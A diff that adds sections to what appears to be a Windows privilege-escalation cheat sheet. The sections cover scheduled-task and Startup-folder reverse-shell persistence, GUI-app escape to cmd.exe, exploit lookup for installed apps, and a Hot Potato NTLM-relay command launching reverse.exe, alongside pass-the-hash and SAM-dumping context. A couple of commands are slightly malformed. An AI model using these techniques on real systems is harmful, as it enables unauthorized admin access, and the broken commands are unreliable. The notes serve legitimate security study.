@@ -301,6 +301,40 @@ python2 pwdump.py /tools/SYSTEM /tools/SAM
 3. or if you wan system shell
 ``` pth-winexe --system -U '<user>%<part1 and part2 hash>' //<kali ip> cmd.exe```
 
+## Schedule Tasks
+- Usually you can only view your own scheduled task with command line.
+```
+schtasks /query /fo /LIST /v
+
+## OR powershell
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*" | ft TaskName,TaskPath,State
+```
+- Mosts of the time you will have to find clues from logs and scripts for other users' scheduled tasks.
+
+- use accesschk to check on the file, if you have permission you can append your reverse shell script path in and wait for it to run.
+
+## Insecure GUI Apps
+1. Look at ```tasklist /V``` to see if any GUI you are running is currently running as admin
+2. Open the ```open file``` option to spawn the browse file environment
+3. Replace this with address bar ```file://C:/Windows/System32/cmd.exe``` press ```Enter```
+
+## Startup Apps
+- Apps will startup for all users if program shortcut is placed in ```C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp```
+- Use accesschk to check for the permission in the directory
+- If you have permission you can create a vbscript to run the reverse shell
+- type ```cscript createshortcut.vbs``` once you transfer the tool
+
+## Installed Apps
+1. enumerate all running program with ```tasklist /V``` or use ```seatbelt.exe``` to search for non-standard program or winpeas.
+2. use exploit-db to search for exploits.
+
+## Hot Potato
+- Spoof along with NTLM relay to gain privilege. works with win 7, 8 and early 10.
+1. start nc
+2. run potato.exe
+```
+.\potato.exe -ip <our ip> -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+```
 
 ## Kernel Exploit (Last resort)
 ### Tools
